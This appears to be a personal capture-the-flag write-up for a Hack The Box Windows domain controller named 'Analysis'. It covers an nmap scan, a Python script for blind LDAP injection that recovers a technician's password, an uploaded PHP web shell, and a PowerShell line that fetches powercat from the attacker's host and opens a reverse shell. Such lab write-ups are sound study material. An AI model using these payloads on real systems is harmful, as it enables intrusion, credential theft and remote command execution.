
Nmap Scanning :

~~~
nmap 10.129.232.211 -sC -sV
~~~

~~~
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 11:26 IST
Nmap scan report for 10.129.232.211
Host is up (0.29s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-23 05:56:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3306/tcp open  mysql         MySQL (unauthorized)
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -18s
| smb2-time: 
|   date: 2024-01-23T05:57:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.06 seconds
~~~


![[Pasted image 20240123113017.png]]
~~~
[02:42:52] 301 -  174B  - /dashboard  ->  http://internal.analysis.htb/dashboard/
[02:45:15] 301 -  170B  - /users  ->  http://internal.analysis.htb/users/ 
~~~



![[Pasted image 20240123154239.png]]


~~~ python

import requests
import logging as log 
import string

log.basicConfig(level=log.DEBUG, format="%(message)s")

PREFIX = "technician)(Description="
CHECK_NAME = "technician"


def check_data(data):
    log.debug(f"Checking: {data}")
    r = requests.get(f"http://internal.analysis.htb//users/list.php?name={PREFIX}{data}")
    if "</table>" == r.text:
        log.debug(f"Error: {data}")
        return False
    elif f"{CHECK_NAME}" in r.text:
        log.debug(f"Success: {data}")
        return True
    else:
        log.debug(f"False: {data}")
        return False


WORDARRAY = [i for i in string.ascii_letters + string.digits]
WORDARRAY.append("\=")
WORDARRAY.append("\*")
WORDARRAY.append("\#")
WORDARRAY.append("{")
WORDARRAY.append("}")
WORDARRAY.append("\(")
WORDARRAY.append("\)")



def check_append():
    result = ""
    while True:
        for i in WORDARRAY:
            if check_data(result + i + "*"):
                result += i
                log.debug(f"Result: {result}")
                break
        else:
            break
    return result

def check_prepend():
    result = ""
    while True:
        for i in WORDARRAY:
            if check_data("*" + i + result):
                result = i + result
                log.debug(f"Result: {result}")
                break
        else:
            break
    return result

def main():
    log.info(check_prepend())
    log.info(check_append())


if __name__ == "__main__":
    main()
~~~

LDAP injection to find the password of the technician

Username: technician@analysis.htb
Password: 97nTtl*4qp96bv

![[Pasted image 20240123223548.png]]

![[Pasted image 20240123223611.png]]

there is an upload option in this website so try to get the shell with this 

~~~php 
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
~~~

to get the shell upload as the file name shell.php

![[Pasted image 20240123223955.png]]

there we able to run the php file in so we can take the shell using this
but in normal shell we didn't not able to interactive shell 

So we using powercat tool to get the interactive shell

by this  we get the shell 

~~~
powershell -c "Start-Sleep -Seconds 10; IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.4:801/powercat.ps1'); powercat -c 10.10.14.4 -p 1234 -e cmd" 
~~~

![[Pasted image 20240123224937.png]]


